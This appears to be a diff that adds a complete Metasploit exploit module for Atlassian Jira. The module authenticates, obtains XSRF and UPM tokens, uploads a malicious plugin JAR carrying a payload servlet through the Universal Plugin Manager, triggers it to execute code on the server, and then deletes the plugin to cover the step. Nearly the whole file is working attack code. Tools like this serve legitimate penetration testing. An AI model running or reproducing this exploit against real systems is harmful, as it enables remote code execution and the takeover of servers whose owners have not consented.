@@ -1,0 +1,233 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Atlassian Jira Authenticated Upload Code Execution',
+      'Description' => %q{
+        This module can be used to execute a payload on Atlassian Jira via
+        the Universal Plugin Manager(UPM). The module requires valid login
+        credentials to an account that has access to the plugin manager.
+        The payload is uploaded as a JAR archive containing a servlet using
+        a POST request against the UPM component. The check command will
+        test the validity of user supplied credentials and test for access
+        to the plugin manager.
+      },
+      'Author'      => 'Alexander Gonzalez(dubfr33)',
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/'],
+          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/'],
+          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/']
+        ],
+      'Platform'    => %w[java],
+      'Targets'     =>
+        [
+          ['Java Universal',
+            {
+              'Arch'     => ARCH_JAVA,
+              'Platform' => 'java'
+            }
+          ]
+        ],
+      'DisclosureDate' => 'Feb 22 2018'))
+
+    register_options(
+      [
+        Opt::RPORT(2990),
+        OptString.new('HttpUsername', [true, 'The username to authenticate as', 'admin']),
+        OptString.new('HttpPassword', [true, 'The password for the specified username', 'admin']),
+        OptString.new('TARGETURI', [true, 'The base URI to Jira', '/jira/'])
+      ])
+  end
+
+  def check
+    login_res = query_login
+    if login_res.nil?
+      vprint_error('Unable to access the web application!')
+      return CheckCode::Unknown
+    end
+    return CheckCode::Unknown unless login_res.code == 200
+    @session_id = get_sid(login_res)
+    @xsrf_token = login_res.get_html_document.at('meta[@id="atlassian-token"]')['content']
+    auth_res = do_auth
+    good_sid = get_sid(auth_res)
+    good_cookie = "atlassian.xsrf.token=#{@xsrf_token}; #{good_sid}"
+    res = query_upm(good_cookie)
+    if res.nil?
+      vprint_error('Unable to access the web application!')
+      return CheckCode::Unknown
+    elsif res.code == 200
+      return Exploit::CheckCode::Appears
+    else
+      vprint_status('Something went wrong, make sure host is up and options are correct!')
+      vprint_status("HTTP Response Code: #{res.code}")
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+  def exploit
+    unless access_login?
+      fail_with(Failure::Unknown, 'Unable to access the web application!')
+    end
+    print_status('Retrieving Session ID and XSRF token...')
+    auth_res = do_auth
+    good_sid = get_sid(auth_res)
+    good_cookie = "atlassian.xsrf.token=#{@xsrf_token}; #{good_sid}"
+    res = query_for_upm_token(good_cookie)
+    if res.nil?
+      fail_with(Failure::Unknown, 'Unable to retrieve UPM token!')
+    end
+    upm_token = res.headers['upm-token']
+    upload_exec(upm_token, good_cookie)
+  end
+
+  # Upload, execute, and remove servlet
+  def upload_exec(upm_token, good_cookie)
+    contents = ''
+    name = Rex::Text.rand_text_alpha(8..12)
+
+    atlassian_plugin_xml = %Q{
+    <atlassian-plugin name="#{name}" key="#{name}" plugins-version="2">
+    <plugin-info>
+        <description></description>
+        <version>1.0</version>
+        <vendor name="" url="" />
+
+        <param name="post.install.url">/plugins/servlet/metasploit/PayloadServlet</param>
+        <param name="post.upgrade.url">/plugins/servlet/metasploit/PayloadServlet</param>
+
+    </plugin-info>
+
+    <servlet name="#{name}" key="metasploit.PayloadServlet" class="metasploit.PayloadServlet">
+        <description>"#{name}"</description>
+        <url-pattern>/metasploit/PayloadServlet</url-pattern>
+    </servlet>
+
+    </atlassian-plugin>
+    }
+
+    # Generates .jar file for upload
+    zip = payload.encoded_jar
+    zip.add_file('atlassian-plugin.xml', atlassian_plugin_xml)
+
+    servlet = MetasploitPayloads.read('java', '/metasploit', 'PayloadServlet.class')
+    zip.add_file('/metasploit/PayloadServlet.class', servlet)
+
+    contents = zip.pack
+
+    boundary = rand_text_numeric(27)
+
+    data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"plugin\"; "
+    data << "filename=\"#{name}.jar\"\r\nContent-Type: application/x-java-archive\r\n\r\n"
+    data << contents
+    data << "\r\n--#{boundary}--"
+
+    print_status("Attempting to upload #{name}")
+    res = send_request_cgi({
+      'uri'            => normalize_uri(target_uri.path, 'rest/plugins/1.0/'),
+      'vars_get'       =>
+        {
+          'token'      => "#{upm_token}"
+        },
+      'method'         => 'POST',
+      'data'           => data,
+      'headers'        =>
+        {
+          'Content-Type' => 'multipart/form-data; boundary=' + boundary,
+          'Cookie'       => good_cookie.to_s
+        }
+    }, 25)
+
+    unless res && res.code == 202
+      print_status("Error uploading #{name}")
+      print_status("HTTP Response Code: #{res.code}")
+      print_status("Server Response: #{res.body}")
+      return
+    end
+
+    print_status("Successfully uploaded #{name}")
+    print_status("Executing #{name}")
+    Rex::ThreadSafe.sleep(3)
+    send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path.to_s, 'plugins/servlet/metasploit/PayloadServlet'),
+      'method'       => 'GET',
+      'cookie'       => good_cookie.to_s
+    })
+
+    print_status("Deleting #{name}")
+    send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path.to_s, "rest/plugins/1.0/#{name}-key"),
+      'method'       => 'DELETE',
+      'cookie'       => good_cookie.to_s
+    })
+  end
+
+  def access_login?
+    res = query_login
+    if res.nil?
+      fail_with(Failure::Unknown, 'Unable to access the web application!')
+    end
+    return false unless res && res.code == 200
+    @session_id = get_sid(res)
+    @xsrf_token = res.get_html_document.at('meta[@id="atlassian-token"]')['content']
+    return true
+  end
+
+  # Sends GET request to login page so the HTTP response can be used
+  def query_login
+    send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, 'login.jsp'))
+  end
+
+  # Queries plugin manager to verify access
+  def query_upm(good_cookie)
+    send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path.to_s, 'plugins/servlet/upm'),
+      'method'       => 'GET',
+      'cookie'       => good_cookie.to_s
+    })
+  end
+
+  # Queries API for response containing upm_token
+  def query_for_upm_token(good_cookie)
+    send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path.to_s, 'rest/plugins/1.0/'),
+      'method'       => 'GET',
+      'cookie'       => good_cookie.to_s
+    })
+  end
+
+  # Authenticates to webapp with user supplied credentials
+  def do_auth
+    send_request_cgi({
+      'uri'              => normalize_uri(target_uri.path.to_s, 'login.jsp'),
+      'method'           => 'POST',
+      'cookie'           => "atlassian.xsrf.token=#{@xsrf_token}; #{@session_id}",
+      'vars_post'        => {
+        'os_username'    => datastore['HttpUsername'],
+        'os_password'    => datastore['HttpPassword'],
+        'os_destination' => '',
+        'user_role'      => '',
+        'atl_token'      => '',
+        'login'          => 'Log+In'
+      }
+    })
+  end
+
+  # Finds SID from HTTP response headers
+  def get_sid(res)
+    if res.nil?
+      return '' if res.blank?
+    end
+    res.get_cookies.scan(/(JSESSIONID=\w+);*/).flatten[0] || ''
+  end
+end
